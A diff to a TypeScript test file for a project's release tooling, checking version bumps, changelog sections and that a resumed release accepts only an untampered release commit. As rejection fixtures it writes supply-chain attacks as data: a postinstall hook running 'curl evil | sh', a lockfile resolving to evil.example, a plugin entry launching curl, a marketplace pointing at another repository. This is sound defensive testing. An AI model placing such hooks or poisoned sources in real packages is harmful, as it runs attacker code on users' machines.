@@ -12,9 +12,11 @@ import {
   draftSection,
   dropNotes,
   inFlight,
+  insertedSection,
   insertSection,
   landOnDevelop,
   lastTag,
+  MARKETPLACE,
   nextVersion,
   parseArgs,
   pickReleasePr,
@@ -22,6 +24,7 @@ import {
   releaseBranches,
   releaseCommitOf,
   releaseState,
+  rewriteVersion,
   runProblems,
   setVersion,
   subjectsSince,
@@ -96,6 +99,12 @@ test('setVersion rewrites only the version lines and the marketplace ref', () =>
       want['package-lock.json'] = want['package-lock.json'].replace('"node_modules/x": {\n      "version": "0.19.0"', '"node_modules/x": {\n      "version": "0.18.7"');
       assert.deepEqual(readFiles(dir, rels), want, `from ref ${ref}`);
     }
+
+    // The same rewrite, on one file's text: what releaseCommitOf replays on a parent's bytes.
+    const texts = versionTexts('0.18.7', 'main');
+    assert.equal(rewriteVersion('package.json', texts['package.json'], '0.18.7', '0.19.0'), versionTexts('0.19.0', 'main')['package.json']);
+    assert.equal(rewriteVersion(MARKETPLACE, texts['.claude-plugin/marketplace.json'], '0.18.7', '0.19.0'), versionTexts('0.18.7', 'v0.19.0')['.claude-plugin/marketplace.json']);
+    assert.throws(() => rewriteVersion('README.md', '{}', '0.18.7', '0.19.0'), Refusal, 'a file no bump touches');
 
     // A refusal writes nothing: no forge plugin, no source.ref, or a version a file does not hold.
     const before = versionTexts('0.18.7', 'main');
@@ -197,6 +206,19 @@ test('the notes draft lists the commits since the previous tag and the versions 
 
   assert.equal(insertSection('# Changelog\n\n## 0.18.7\n\n- Old.\n', '## 0.19.0\n\n- New.'), '# Changelog\n\n## 0.19.0\n\n- New.\n\n## 0.18.7\n\n- Old.\n');
   assert.equal(insertSection('# Changelog\n', '## 0.1.0\n\n- First.'), '# Changelog\n\n## 0.1.0\n\n- First.\n');
+
+  // insertedSection reads back what insertSection put in, and nothing else.
+  const log = '# Changelog\n\n## 0.18.7\n\n- Old.\n';
+  assert.equal(insertedSection(log, insertSection(log, '## 0.19.0\n\n- New.')), '## 0.19.0\n\n- New.');
+  assert.equal(insertedSection('# Changelog\n', insertSection('# Changelog\n', '## 0.1.0\n\n- First.')), '## 0.1.0\n\n- First.');
+  const notInserted: [string, string][] = [
+    ['unchanged', log],
+    ['an older section edited', insertSection(log, '## 0.19.0').replace('- Old.', '- Older.')],
+    ['something above the heading', `x${insertSection(log, '## 0.19.0')}`],
+    ['something after the old section', `${insertSection(log, '## 0.19.0')}- More.\n`],
+    ['empty', ''],
+  ];
+  for (const [what, text] of notInserted) assert.equal(insertedSection(log, text), null, what);
 });
 
 test('runProblems trusts only a successful push run of the named workflow on the exact commit', () => {
@@ -262,6 +284,7 @@ test('prepare commits the release on release/v<version> and leaves develop alone
 
     assert.equal(out(repo, 'rev-parse', 'refs/heads/release/v1.1.0'), sha);
     assert.equal(out(repo, 'rev-list', '--parents', '-n', '1', sha), `${sha} ${develop}`, 'its only parent is develop');
+    assert.equal(releaseCommitOf(repo.dir, sha, '1.1.0', 'develop'), sha, 'what prepare makes is what a resume accepts');
     assert.equal(out(repo, 'log', '-1', '--format=%B', sha), 'Release 1.1.0');
     const at = (rel: string) => out(repo, 'show', `${sha}:${rel}`);
     assert.equal(JSON.parse(at('package.json')).version, '1.1.0');
@@ -380,43 +403,54 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
   const repo = tempRepo();
   try {
     const sha = () => out(repo, 'rev-parse', 'HEAD');
-    const version = (v: string) => fs.writeFileSync(path.join(repo.dir, 'package.json'), JSON.stringify({ name: 'forge', version: v }));
     const dist = () => {
       fs.mkdirSync(path.join(repo.dir, 'dashboard', 'dist'), { recursive: true });
       fs.writeFileSync(path.join(repo.dir, 'dashboard', 'dist', 'index.html'), '<!doctype html>\n');
       repo.git('add', '--force', 'dashboard/dist');
     };
-    version('1.0.0');
+    writeFiles(repo.dir, { ...versionTexts('1.0.0', 'v1.0.0'), 'CHANGELOG.md': '# Changelog\n\n## 1.0.0\n\n- First.\n' });
     repo.git('add', '-A');
     repo.git('commit', '-qm', 'Release 1.0.0');
     repo.git('checkout', '-qb', 'develop');
     repo.git('commit', '-q', '--allow-empty', '-m', 'feat: work');
     const work = sha();
-    version('1.1.0');
-    repo.git('commit', '-qam', 'Release 1.1.0');
-    const release = sha();
-    // Wrong subjects and versions, each a one-parent commit on top of the work.
-    const commitOn = (base: string, subject: string, v: string) => {
+    // The release commit `prepare` makes on `base` (a commit at 1.0.0): the bump and the notes, then `edit` on top of them.
+    const releaseOn = (base: string, o: { subject?: string; to?: string; notes?: string; edit?: () => void } = {}) => {
       repo.git('checkout', '-q', '--detach', base);
-      version(v);
-      repo.git('commit', '-q', '--allow-empty', '-am', subject);
+      setVersion(repo.dir, '1.0.0', o.to ?? '1.1.0');
+      const changelog = path.join(repo.dir, 'CHANGELOG.md');
+      fs.writeFileSync(changelog, insertSection(fs.readFileSync(changelog, 'utf8'), o.notes ?? '## 1.1.0\n\n- New things.'));
+      o.edit?.();
+      repo.git('add', '-A');
+      repo.git('commit', '-qm', o.subject ?? 'Release 1.1.0');
       return sha();
     };
-    const sloppy = commitOn(work, 'Release 1.1.0 (#3)', '1.1.0');
-    const lower = commitOn(work, 'release 1.1.0', '1.1.0');
-    const behind = commitOn(work, 'Release 1.1.0', '1.0.9');
+    const replaceIn = (rel: string, from: string, to: string) => () => {
+      const file = path.join(repo.dir, rel);
+      const text = fs.readFileSync(file, 'utf8');
+      assert.ok(text.includes(from), `${rel} holds ${from}`);
+      fs.writeFileSync(file, text.replace(from, to));
+    };
+    const release = releaseOn(work);
+    // Wrong subjects and versions, each a one-parent commit on top of the work.
+    const sloppy = releaseOn(work, { subject: 'Release 1.1.0 (#3)' });
+    const lower = releaseOn(work, { subject: 'release 1.1.0' });
+    const behind = releaseOn(work, { to: '1.0.9', notes: '## 1.0.9\n\n- Notes.' });
     // Right subject and version, but not develop plus the bump: another file changed next to it, or a parent develop lacks.
-    repo.git('checkout', '-q', '--detach', work);
-    version('1.1.0');
-    fs.writeFileSync(path.join(repo.dir, 'postinstall.sh'), 'curl evil | sh\n');
-    repo.git('add', '-A');
-    repo.git('commit', '-qm', 'Release 1.1.0');
-    const extra = sha();
+    const extra = releaseOn(work, { edit: () => fs.writeFileSync(path.join(repo.dir, 'postinstall.sh'), 'curl evil | sh\n') });
     repo.git('checkout', '-q', '--detach', 'main');
     repo.git('commit', '-q', '--allow-empty', '-m', 'fix: only on main');
-    version('1.1.0');
-    repo.git('commit', '-qam', 'Release 1.1.0');
-    const foreign = sha();
+    const foreign = releaseOn(sha());
+    // The right files, but not only the bump in them: a dependency fetched from elsewhere, a hook, a script, another
+    // plugin source, a marketplace ref left behind, an older section rewritten, a section that is not this version's.
+    const lock = releaseOn(work, { edit: replaceIn('package-lock.json', '"node_modules/x": {', '"node_modules/x": {\n      "resolved": "https://evil.example/x.tgz",') });
+    const plugin = releaseOn(work, { edit: replaceIn('.claude-plugin/plugin.json', '"name": "forge",', '"name": "forge",\n  "mcpServers": { "x": { "command": "curl" } },') });
+    const market = releaseOn(work, { edit: replaceIn('.claude-plugin/marketplace.json', 'github.com/o/forge.git', 'github.com/evil/forge.git') });
+    const stale = releaseOn(work, { edit: replaceIn('.claude-plugin/marketplace.json', '"ref": "v1.1.0"', '"ref": "v1.0.0"') });
+    const script = releaseOn(work, { edit: replaceIn('package.json', '"files"', '"scripts": { "postinstall": "curl evil | sh" },\n  "files"') });
+    const history = releaseOn(work, { edit: replaceIn('CHANGELOG.md', '- First.', '- Rewritten.') });
+    const heading = releaseOn(work, { notes: '## 1.1.1\n\n- Notes.' });
+    const untrimmed = releaseOn(work, { notes: '## 1.1.0\n\n- Notes.\n' });
     // The main update: main plus the release commit plus dist; a hotfix tip tracks dist with one parent.
     const mergeOnMain = (second: string) => {
       repo.git('checkout', '-q', '--detach', 'main');
@@ -427,11 +461,8 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
     };
     const update = mergeOnMain(release);
     const notOfARelease = mergeOnMain(work);
-    repo.git('checkout', '-q', '--detach', 'main');
-    version('1.1.0');
-    dist();
-    repo.git('commit', '-qam', 'Release 1.1.0');
-    const hotfix = sha();
+    const poisoned = mergeOnMain(lock);
+    const hotfix = releaseOn('main', { edit: dist });
 
     const rows: [string, string, string, string | null][] = [
       ['a release commit', release, '1.1.0', release],
@@ -446,6 +477,15 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
       ['not a sha', 'HEAD', '1.1.0', null],
       ['a release commit that changes another file', extra, '1.1.0', null],
       ['a release commit whose parent develop lacks', foreign, '1.1.0', null],
+      ['a lockfile whose resolved URL changed', lock, '1.1.0', null],
+      ['a main update over that lockfile', poisoned, '1.1.0', null],
+      ['a plugin.json that gained a key', plugin, '1.1.0', null],
+      ['a marketplace.json that names another repo', market, '1.1.0', null],
+      ['a marketplace ref left at the old tag', stale, '1.1.0', null],
+      ['a package.json that gained a script', script, '1.1.0', null],
+      ['a CHANGELOG that rewrote an older section', history, '1.1.0', null],
+      ['a CHANGELOG section for another version', heading, '1.1.0', null],
+      ['a CHANGELOG section with a trailing blank line', untrimmed, '1.1.0', null],
     ];
     // `develop` is the ref a release commit's parent must be on (origin/develop for a resume).
     for (const [what, tip, v, want] of rows) assert.equal(releaseCommitOf(repo.dir, tip, v, 'develop'), want, what);
